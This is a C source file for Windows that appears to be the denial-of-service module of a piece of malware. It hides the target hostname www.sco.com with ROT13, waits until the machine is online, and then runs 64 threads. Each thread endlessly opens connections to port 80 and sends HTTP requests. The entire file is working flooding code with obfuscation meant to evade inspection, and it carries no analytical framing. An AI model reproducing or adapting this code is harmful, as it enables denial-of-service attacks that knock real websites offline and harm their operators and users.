#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include "sco.h"
#include "lib.h"

#define SCO_SITE_ROT13 "jjj.fpb.pbz"	/* www.sco.com */
#define SCO_PORT 80
#define SCODOS_THREADS 64

static int connect_tv(struct sockaddr_in *addr, int timeout)
{
	int s;
	unsigned long i;
	fd_set wr_fds, err_fds;
	struct timeval tv;

	s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == 0 || s == INVALID_SOCKET) return 0;

	tv.tv_sec = timeout / 1000;
	tv.tv_usec = 0;

	i = 1;
	ioctlsocket(s, FIONBIO, &i);

	for (;;) {
		i = connect(s, (struct sockaddr *)addr, sizeof(struct sockaddr_in));
		if (i != SOCKET_ERROR)
			goto exit_connected;
		i = WSAGetLastError();
		if (i == WSAENOBUFS) {
			Sleep(50);
			continue;
		}
		if (i == WSAEWOULDBLOCK)
			break;
		goto exit_err;
	}

	FD_ZERO(&wr_fds);
	FD_SET(s, &wr_fds);
	FD_ZERO(&err_fds);
	FD_SET(s, &err_fds);
	i = select(s+1, NULL, &wr_fds, &err_fds, &tv);

	if (i == 0 || i == -1)
		goto exit_err;		
	if (FD_ISSET(s, &err_fds) || !FD_ISSET(s, &wr_fds))
		goto exit_err;

exit_connected:
	i = 0;
	ioctlsocket(s, FIONBIO, &i);
	return s;

exit_err:
	closesocket(s);
	return 0;
}

static DWORD _stdcall scodos_th(LPVOID pv)
{
	struct sockaddr_in addr;
	char buf[512];
	int sock;

	rot13(buf,
		/*
		 * "GET / HTTP/1.1\r\n"
		 * "Host: www.sco.com\r\n"
		 * "\r\n";
		 */
		"TRG / UGGC/1.1\r\n"
		"Ubfg: " SCO_SITE_ROT13 "\r\n"
		"\r\n");

	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
	if (pv == NULL) goto ex;
	addr = *(struct sockaddr_in *)pv;
	for (;;) {
		sock = connect_tv(&addr, 8);
		if (sock != 0) {
			send(sock, buf, lstrlen(buf), 0);
			Sleep(300);
			closesocket(sock);
		}
	}
ex:	ExitThread(0);
	return 0;
}

void scodos_main(void)
{
	struct hostent *h;
	struct sockaddr_in addr;
	int i;
	unsigned long tid;
	char buf[128];

	rot13(buf, SCO_SITE_ROT13);

	for (;;) {
		while (is_online() == 0)
			Sleep(32768);

		h = gethostbyname(buf);
		if (h == NULL) {
			Sleep(32768);
			continue;
		}
		memset(&addr, '\0', sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr = *(struct in_addr *)h->h_addr_list[0];
		addr.sin_port = htons(SCO_PORT);
		break;
	}

	for (i=1; i<SCODOS_THREADS; i++)
		CreateThread(0, 0, scodos_th, (LPVOID)&addr, 0, &tid);
	scodos_th(&addr);
}
